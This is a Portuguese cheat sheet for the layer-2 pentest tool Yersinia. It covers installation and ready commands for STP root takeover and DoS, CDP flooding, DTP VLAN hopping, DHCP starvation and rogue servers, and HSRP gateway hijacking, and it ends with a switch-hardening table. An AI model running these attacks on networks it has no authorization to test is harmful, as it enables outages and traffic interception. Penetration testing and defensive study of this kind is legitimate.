<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Folha de dicas de Yersinia

[Yersinia](https://github.com/tomac/yersinia) é uma poderosa estrutura de teste de penetração de rede de camada 2 (camada de link de dados) projetada para analisar e explorar pontos fracos em protocolos de camada 2, como STP (Spanning Tree Protocol), CDP (Cisco Discovery Protocol), DTP (Dynamic Trunking Protocol), DHCP, HSRP e entroncamento VLAN 802.1Q.

---

## Índice

- [Protocolos e modos suportados](#protocolos suportados--modos)
- [Instalação](#instalação)
- [Modo de maldições interativas (`-I`)](#modo de maldições interativas--i)
- [Ataques de Spanning Tree Protocol (STP)](#spanning-tree-protocol-stp-attacks)
- [Ataques do Cisco Discovery Protocol (CDP)](#cisco-discovery-protocol-cdp-attacks)
- [Protocolo de entroncamento dinâmico (DTP) e salto de VLAN](#dynamic-trunking-protocol-dtp--vlan-hopping)
- [DHCP Rogue & Starvation Attacks](#dhcp-rogue--starvation-attacks)
- [Sequestro de HSRP e VRRP](#hsrp--vrrp-sequestro)
- [Mitigação e endurecimento](#mitigação--endurecimento)

---

## Protocolos e modos suportados

Yersinia tem como alvo protocolos que operam abaixo do IP:
- **STP:** Spanning Tree Protocol (controle de função da ponte raiz, notificações de alteração de topologia).
- **CDP:** Cisco Discovery Protocol (inundação de dispositivos, injeção de vizinho falso).
- **DTP:** Protocolo de trunking dinâmico (negociação de links de tronco para acessar todas as VLANs).
- **DHCP:** Protocolo de configuração dinâmica de host (servidores DHCP inanimados e não autorizados).
- **HSRP:** Protocolo de roteador Hot Standby (controle de gateway ativo).
- **802.1Q/802.1X:** Salto de VLAN Dot1Q e esgotamento de EAPOL.
- **VTP:** Protocolo de entroncamento VLAN (exclusão/substituição do banco de dados VLAN).

Modos de execução:
- **`-I` (Cursos Interativos):** UI de terminal em tela cheia para seleção de protocolos, configuração de ataques e monitoramento de pacotes ativos.
- **CLI não interativa:** Execução direta para scripts automatizados.

---

## Instalação
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y yersinia

# Arch Linux / BlackArch
sudo pacman -S yersinia

# Run in terminal
yersinia -h
```
---

## Modo de Maldições Interativas (`-I`)

A maneira mais prática e segura de usar Yersinia no terminal sem GUI:
```bash
sudo yersinia -I
```
- **`h`**: Exibe ajuda e atalhos de teclado.
- **`g`**: Protocolos de comutação (STP, CDP, DTP, DHCP, HSRP, etc.).
- **`x`**: Executa o menu de ataque para o protocolo atual.
- **`c`**: Cancela ataque em execução.
- **`l`**: Alternar registro de pacotes.
- **`q`**: Saia de Yersinia.

---

## Ataques de Spanning Tree Protocol (STP)

O STP elege uma bridge raiz com o Bridge ID mais baixo (Prioridade + MAC). Yersinia pode injetar BPDUs (Bridge Protocol Data Units) falsos para reivindicar o status de root e redirecionar o tráfego através do host do invasor.

### 1. Reivindicar função raiz (injeção de BPDU)
Envie BPDUs com prioridade `0` e um endereço MAC inferior para se tornar o STP Root Bridge:
```bash
sudo yersinia stp -attack 1 -i eth0
```
### 2. Reivindicar função raiz com alteração de topologia (TCN)
Forçar todos os switches a liberar tabelas CAM e reconvergir através do invasor:
```bash
sudo yersinia stp -attack 2 -i eth0
```
### 3. Ataque DoS STP (BPDUs de configuração de inundação)
Crash ou saturação da CPU do switch com enormes quadros BPDU conflitantes:
```bash
sudo yersinia stp -attack 0 -i eth0
```
---

## Ataques do Cisco Discovery Protocol (CDP)

O CDP compartilha nomes de dispositivos, modelos, recursos e versões de software não autenticados em dispositivos Cisco.

### 1. Inundar vizinhos CDP falsos
Esgote a memória do switch e crie dispositivos fantasmas em `show cdp neighbors`:
```bash
sudo yersinia cdp -attack 0 -i eth0
```
### 2. Capturar e inspecionar pacotes CDP legítimos
Execute o modo de maldições interativas (`yersinia -I`), pressione `g`, selecione `CDP` e observe o nome do host do switch, IP de gerenciamento, modelo de hardware e ID de VLAN nativo.

---

## Protocolo de entroncamento dinâmico (DTP) e salto de VLAN

O DTP negocia automaticamente links de trunking se as portas do switch estiverem configuradas no modo `dynamic desirable` ou `dynamic auto`.

### 1. Negociar link de trunking (pacote DTP desejável)
Engane a porta do switch para que se transforme em um tronco 802.1Q:
```bash
sudo yersinia dtp -attack 0 -i eth0
```
Depois que o tronco for negociado, capture quadros de todas as VLANs ou marque pacotes em sub-redes isoladas usando interfaces Linux 802.1Q:
```bash
# Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```
---

## Ataques desonestos e de fome de DHCP

### 1. Ataque de fome de DHCP (pool de IP de exaustão)
Envie milhares de solicitações DHCP DISCOVER com endereços MAC aleatórios para consumir todos os endereços IP disponíveis no pool:
```bash
sudo yersinia dhcp -attack 1 -i eth0
```
### 2. Configurar servidor DHCP não autorizado
Implante um servidor DHCP não autorizado com DNS e gateway personalizados:
```bash
sudo yersinia dhcp -attack 2 -i eth0
```
---

## Sequestro de HSRP e VRRP

O HSRP permite que vários roteadores apresentem um único gateway virtual padrão.

### 1. Reivindique prioridade do roteador ativo
Injete pacotes HSRP HELLO com prioridade 255 para assumir o IP do gateway padrão:
```bash
sudo yersinia hsrp -attack 0 -i eth0
```
---

## Mitigação e endurecimento

| Protocolo | Vetor de ataque | Cisco / mitigação padrão |
|---|---|---|
| **STP** | Injeção de ponte raiz falsa | `spanning-tree bpduguard enable` nas portas de acesso; `spanning-tree rootguard` em links entre switches. |
| **DTP** | Negociação de Tronco Rogue | `switchport mode access` e `switchport nonegotiate` em todas as portas de acesso voltadas ao usuário. |
| **CDP** | Inundações / Divulgação de informações | `no cdp run` (globalmente) ou `no cdp enable` em portas de interface não confiáveis. |
| **DHCP** | Servidor Starvation e Rogue | Habilite `ip dhcp snooping`, limite a taxa por porta, configure portas de uplink confiáveis. |
| **HSRP** | Sequestro prioritário | Configure a autenticação MD5 com chaves secretas (`standby 1 authentication md5 key-string <SECRET>`). |